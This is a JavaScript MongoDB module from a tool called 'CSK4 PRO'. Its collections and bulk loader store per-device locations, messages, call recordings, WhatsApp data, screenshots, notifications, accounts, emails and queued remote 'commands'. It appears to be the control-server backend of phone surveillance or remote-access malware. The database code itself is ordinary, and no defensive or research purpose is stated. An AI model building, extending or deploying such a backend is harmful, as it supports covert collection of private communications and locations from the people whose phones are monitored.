// ============================================
// CSK4 PRO v4.2 - MongoDB Connection (FIXED)
// ============================================
// FIXES:
// - No hardcoded URI (env only)
// - bulkWrite with ordered:false
// - $set/$setOnInsert conflict fixed
// - Better error recovery
// - Parallel counts
// - No silent empty array
// ============================================

const { MongoClient } = require('mongodb');

// ============ CONFIG ============
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = process.env.DB_NAME || 'csk4';

// ============ CLIENT ============
let client = null;
let db = null;
let isConnected = false;

// ============ COLLECTIONS ============
const COLLECTIONS = {
  DEVICES: 'devices',
  LOCATIONS: 'locations',
  CONTACTS: 'contacts',
  FILES: 'files',
  PHOTOS: 'photos',
  VIDEOS: 'videos',
  AUDIO: 'audio',
  MESSAGES: 'messages',
  CALL_LOGS: 'callLogs',
  CALL_RECORDINGS: 'callRecordings',
  APPS: 'apps',
  SCREENSHOTS: 'screenshots',
  BLUETOOTH: 'bluetooth',
  NOTIFICATIONS: 'notifications',
  WHATSAPP: 'whatsapp',
  ACTIVITIES: 'activities',
  SIM_INFO: 'simInfo',
  ACCOUNTS: 'accounts',
  EMAILS: 'emails',
  COMMANDS: 'commands',
  DEVICE_INFO: 'deviceInfo'
};

// ============ CONNECT ============
async function connect() {
  if (isConnected && client && db) {
    return db;
  }

  if (!MONGODB_URI) {
    console.log('⚠️ MONGODB_URI not set — skipping');
    return null;
  }

  try {
    console.log('🔌 Connecting to MongoDB...');
    
    client = new MongoClient(MONGODB_URI, {
      maxPoolSize: 10,
      minPoolSize: 2,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000,
      retryWrites: true,
      retryReads: true
    });

    await client.connect();
    db = client.db(DB_NAME);
    
    // Test connection
    await db.command({ ping: 1 });
    
    isConnected = true;
    console.log('✅ MongoDB connected successfully');
    console.log(`   Database: ${DB_NAME}`);
    
    // Create indexes for performance
    await createIndexes();
    
    return db;
  } catch (error) {
    console.error('❌ MongoDB connection failed:', error.message);
    isConnected = false;
    throw error;
  }
}

// ============ CREATE INDEXES ============
async function createIndexes() {
  try {
    const database = client.db(DB_NAME);
    
    await Promise.all([
      database.collection(COLLECTIONS.DEVICES).createIndex({ deviceId: 1 }, { unique: true }),
      database.collection(COLLECTIONS.LOCATIONS).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.MESSAGES).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.CONTACTS).createIndex({ deviceId: 1, phone: 1 }),
      database.collection(COLLECTIONS.NOTIFICATIONS).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.WHATSAPP).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.ACTIVITIES).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.COMMANDS).createIndex({ deviceId: 1, status: 1 }),
      database.collection(COLLECTIONS.CALL_LOGS).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.CALL_RECORDINGS).createIndex({ deviceId: 1, time: -1 }),
      database.collection(COLLECTIONS.NOTIFICATIONS).createIndex({ time: -1 }),
      database.collection(COLLECTIONS.ACTIVITIES).createIndex({ time: -1 })
    ]);
    
    console.log('✅ MongoDB indexes created');
  } catch (error) {
    console.error('⚠️ Index creation error:', error.message);
  }
}

// ============ GET DB ============
function getDb() {
  if (!db) throw new Error('MongoDB not connected');
  return db;
}

// ============ SAVE FUNCTION ============
async function save(collection, data) {
  try {
    const database = getDb();
    const result = await database.collection(collection).insertOne({
      ...data,
      createdAt: new Date()
    });
    return result;
  } catch (error) {
    console.error(`❌ Save error (${collection}):`, error.message);
    throw error;
  }
}

// ============ SAVE MANY (FIXED: bulkWrite ordered:false) ============
async function saveMany(collection, dataArray) {
  try {
    if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
    const database = getDb();
    
    const ops = dataArray.map(item => ({
      insertOne: {
        document: { ...item, createdAt: new Date() }
      }
    }));
    
    const result = await database.collection(collection).bulkWrite(ops, { ordered: false });
    return result;
  } catch (error) {
    console.error(`❌ SaveMany error (${collection}):`, error.message);
    // Return partial success
    return { insertedCount: 0, error: error.message };
  }
}

// ============ UPDATE ONE (FIXED: no $set/$setOnInsert conflict) ============
async function updateOne(collection, filter, data) {
  try {
    const database = getDb();
    
    // ✅ Remove createdAt to prevent conflict
    const updateData = { ...data };
    delete updateData.createdAt;
    delete updateData._id;
    
    const result = await database.collection(collection).updateOne(
      filter,
      { 
        $set: { ...updateData, updatedAt: new Date() },
        $setOnInsert: { createdAt: new Date() }
      },
      { upsert: true }
    );
    return result;
  } catch (error) {
    console.error(`❌ Update error (${collection}):`, error.message);
    throw error;
  }
}

// ============ FIND ============
async function find(collection, filter = {}, options = {}) {
  try {
    const database = getDb();
    let cursor = database.collection(collection).find(filter);
    
    if (options.sort) cursor = cursor.sort(options.sort);
    if (options.limit) cursor = cursor.limit(options.limit);
    if (options.skip) cursor = cursor.skip(options.skip);
    if (options.projection) cursor = cursor.project(options.projection);
    
    return await cursor.toArray();
  } catch (error) {
    console.error(`❌ Find error (${collection}):`, error.message);
    // ✅ Don't silently return empty — log and rethrow
    throw error;
  }
}

// ============ FIND ONE ============
async function findOne(collection, filter) {
  try {
    const database = getDb();
    return await database.collection(collection).findOne(filter);
  } catch (error) {
    console.error(`❌ FindOne error (${collection}):`, error.message);
    return null;
  }
}

// ============ DELETE ============
async function remove(collection, filter) {
  try {
    const database = getDb();
    return await database.collection(collection).deleteMany(filter);
  } catch (error) {
    console.error(`❌ Delete error (${collection}):`, error.message);
    throw error;
  }
}

// ============ COUNT ============
async function count(collection, filter = {}) {
  try {
    const database = getDb();
    return await database.collection(collection).countDocuments(filter);
  } catch (error) {
    console.error(`❌ Count error (${collection}):`, error.message);
    return 0;
  }
}

// ============ GET STATS (FIXED: parallel) ============
async function getStats() {
  try {
    const database = getDb();
    const stats = {};
    
    // ✅ Parallel execution
    const promises = Object.entries(COLLECTIONS).map(async ([name, coll]) => {
      try {
        stats[name.toLowerCase()] = await database.collection(coll).estimatedDocumentCount();
      } catch (e) {
        stats[name.toLowerCase()] = 0;
      }
    });
    
    await Promise.all(promises);
    return stats;
  } catch (error) {
    console.error('❌ Stats error:', error.message);
    return {};
  }
}

// ============ LOAD ALL DATA ============
async function loadAllData() {
  try {
    const database = getDb();
    
    const [
      devices,
      locations,
      contacts,
      files,
      photos,
      videos,
      audio,
      messages,
      callLogs,
      callRecordings,
      apps,
      screenshots,
      bluetooth,
      notifications,
      whatsapp,
      activities,
      simInfo,
      accounts,
      emails,
      commands,
      deviceInfo
    ] = await Promise.all([
      database.collection(COLLECTIONS.DEVICES).find().toArray(),
      database.collection(COLLECTIONS.LOCATIONS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.CONTACTS).find().limit(5000).toArray(),
      database.collection(COLLECTIONS.FILES).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.PHOTOS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.VIDEOS).find().sort({ time: -1 }).limit(200).toArray(),
      database.collection(COLLECTIONS.AUDIO).find().sort({ time: -1 }).limit(200).toArray(),
      database.collection(COLLECTIONS.MESSAGES).find().sort({ time: -1 }).limit(2000).toArray(),
      database.collection(COLLECTIONS.CALL_LOGS).find().sort({ time: -1 }).limit(2000).toArray(),
      database.collection(COLLECTIONS.CALL_RECORDINGS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.APPS).find().limit(1000).toArray(),
      database.collection(COLLECTIONS.SCREENSHOTS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.BLUETOOTH).find().limit(500).toArray(),
      database.collection(COLLECTIONS.NOTIFICATIONS).find().sort({ time: -1 }).limit(1000).toArray(),
      database.collection(COLLECTIONS.WHATSAPP).find().sort({ time: -1 }).limit(1000).toArray(),
      database.collection(COLLECTIONS.ACTIVITIES).find().sort({ time: -1 }).limit(2000).toArray(),
      database.collection(COLLECTIONS.SIM_INFO).find().toArray(),
      database.collection(COLLECTIONS.ACCOUNTS).find().toArray(),
      database.collection(COLLECTIONS.EMAILS).find().toArray(),
      database.collection(COLLECTIONS.COMMANDS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.DEVICE_INFO).find().toArray()
    ]);
    
    // Convert arrays to objects
    const devicesObj = {};
    devices.forEach(d => { if (d.deviceId) devicesObj[d.deviceId] = d; });
    
    const simInfoObj = {};
    simInfo.forEach(s => { if (s.deviceId) simInfoObj[s.deviceId] = s; });
    
    const accountsObj = {};
    accounts.forEach(a => { if (a.deviceId) accountsObj[a.deviceId] = a; });
    
    const emailsObj = {};
    emails.forEach(e => { if (e.deviceId) emailsObj[e.deviceId] = e; });
    
    const deviceInfoObj = {};
    deviceInfo.forEach(d => { if (d.deviceId) deviceInfoObj[d.deviceId] = d; });
    
    return {
      devices: devicesObj,
      locations,
      contacts,
      files,
      photos,
      videos,
      audio,
      messages,
      callLogs,
      callRecordings,
      apps,
      screenshots,
      bluetooth,
      notifications,
      whatsapp,
      activities,
      simInfo: simInfoObj,
      accounts: accountsObj,
      emails: emailsObj,
      commands,
      deviceInfo: deviceInfoObj
    };
  } catch (error) {
    console.error('❌ LoadAll error:', error.message);
    return null;
  }
}

// ============ CLOSE ============
async function close() {
  if (client) {
    try {
      await client.close();
      isConnected = false;
      console.log('🔌 MongoDB connection closed');
    } catch (e) {
      console.error('MongoDB close error:', e.message);
    }
  }
}

// ============ EXPORTS ============
module.exports = {
  connect,
  close,
  getDb,
  save,
  saveMany,
  updateOne,
  find,
  findOne,
  remove,
  count,
  getStats,
  loadAllData,
  COLLECTIONS,
  isConnected: () => isConnected
};
